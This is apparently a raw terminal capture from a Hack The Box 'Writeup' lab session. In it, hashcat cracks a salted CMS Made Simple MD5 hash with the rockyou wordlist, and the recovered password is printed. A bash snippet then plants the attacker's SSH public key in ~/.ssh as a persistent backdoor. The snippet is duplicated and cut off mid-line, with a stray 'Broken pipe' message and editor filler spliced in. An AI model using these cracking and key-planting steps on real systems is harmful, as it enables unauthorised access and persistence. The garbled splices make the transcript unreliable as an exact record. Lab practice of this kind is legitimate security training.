┌─[root@parrot]─[~/hackthebox/writeup]    
└──╼ #vi cms-made-simple.hash             
┌─[root@parrot]─[~/hackthebox/writeup]    
└──╼ #hashcat -m 20 cms-made-simple.hash /opt/wordlists/rockyou.txt                  
hashcat (v5.1.0) starting...              

* Device #1: Not a native Intel OpenCL runtime. Expect massive speed loss.           
             You can use --force to override, but do not report related errors.      
No devices found/left.                    

Started: Sun Jan  5 22:27:19 2020         
Stopped: Sun Jan  5 22:27:20 2020         
┌─[✗]─[root@parrot]─[~/hackthebox/writeup]
└──╼ #hashcat -m 20 cms-made-simple.hash /opt/wordlists/rockyou.txt --force          
hashcat (v5.1.0) starting...              

OpenCL Platform #1: The pocl project      
====================================      
* Device #1: pthread-Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz, 512/1493 MB allocatable, 2MCU                                                                              

Hashes: 1 digests; 1 unique digests, 1 unique salts                                  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates         
Rules: 1                                  

Applicable optimizers:                    
* Zero-Byte                               
* Early-Skip                              
* Not-Iterated                            
* Single-Hash                             
* Single-Salt                             
* Raw-Hash                                

Minimum password length supported by kernel: 0                                       
Maximum password length supported by kernel: 256                                     
Minimim salt length supported by kernel: 0                                           
Maximum salt length supported by kernel: 256                                         

ATTENTION! Pure (unoptimized) OpenCL kernels selected.                               
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.                                                                
If you want to switch to optimized OpenCL kernels, append -O to your commandline.    

Watchdog: Hardware monitoring interface not found on your system.                    
Watchdog: Temperature abort trigger disabled.                                        

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=20 -D _unroll'                                                                         
* Device #1: Kernel m00020_a0-pure.93e6efee.kernel not found in cache! Building may take a while...                                                                        
Dictionary cache hit:                     
* Filename..: /opt/wordlists/rockyou.txt  
* Passwords.: 14344384                    
* Bytes.....: 139921497                   
* Keyspace..: 14344384                    

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9                         
                                                                                     
Session..........: hashcat                
Status...........: Cracked                
#!/bin/bash                               

touch /tmp/arrow                                                                                                                                                           
mkdir ~/.ssh                                                                                                                                                               


echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnpxdnOufCRjURqeyxy3OERv6TeE98cexypkyhRWL48wA8grwLsAAayZrYe1IjN7Hz90aqw9mJe87lSvMkTTEijMt9M+L9UQEJ73UnMI36tmdQdPtodK3zPZo4m9FQnoeXP/OBoQMvA6mTTOG3OOY+0fKKau0U/cr+dL7d+zcqU84+p3S+gXFkY4PW7OnQvVZlBfk1Xd1FmB9Q814q+46NLVMPzluMabeFRaRP0ep1c0JUiN1YiAiFKSP6rW8RvVX2IO/CjSOIInyNU9XpmHXdMoerx7zegPdMgU3LF6HU5IOFppuHVsPiCN7zMjnJnaQAc4SWxPd3EXpJ+lS7+tCl10fwC3bLb6BtzTCdaD9kRwqKHo96w3agcy1pTF68eQVO6w9Q+pZTQ79CJrdOkyHdfw/UDxV5GGPp9W7ijdtSoK559X4s7SoJ1Kv6da26g6OVtIdRNH3LNbvQjNuh+5zBhyhKs3ApMHUETGCrdd/r9qDs2gejiqrRBCqGhJ/MXRU= root@parrot' >> #!/bin/bash                                                                                                  

touch /tmp/arrow                                                                                                                                                           
mkdir ~/.ssh                                                                                                                                                               


echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnpxdnOufCRjURqeyxy3OERv6TeE98cexypkyhRWL48wA8grwLsAAayZrYe1IjN7Hz90aqw9mJe87lSvMkTTEijMt9M+L9UQEJ73UnMI36tmdQdPtodK3zPZo4m9FQnoeXP/OBoQMvA6mTTOG3OOY+0fKKau0U/cr+dL7d+zcqU84+p3S+gXFkY4PW7OnQvVZlBfk1Xd1FmB9Q814q+46NLVMPzluMabeFRaRP0ep1c0JUiN1YiAiFKSP6rW8RvVX2IO/CjSOIInyNU9XpmHXdMoerx7zegPdMgU3LF6HU5IOFppuHVsPiCN7zMjnJnaQAc4SWxPd3EXpJ+lS7+tCl10fwC3bLb6BtzTCdaD9kRwqKHo96w3agcy1pTF68eQVO6w9Q+pZTQ79CJrdOkyHdfw/UDxV5GGPp9W7ijdtSoK559X4s7SoJ1Kv6da26g6OVtIdRNH3LNbvQjNuh+5zBhyhKs3ApMHUETGCrdd/r9qDs2gejiqrRBCqGhJ/MXRU= root@parrotclient_loop: send disconnect: Broken pipe                                                                         
┌─[✗]─[root@parrot]─[~/hackthebox/writeup]                                                                                                                                 
└──╼ #                                                                                                                                                                     
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
~                                                                                                                                                                          
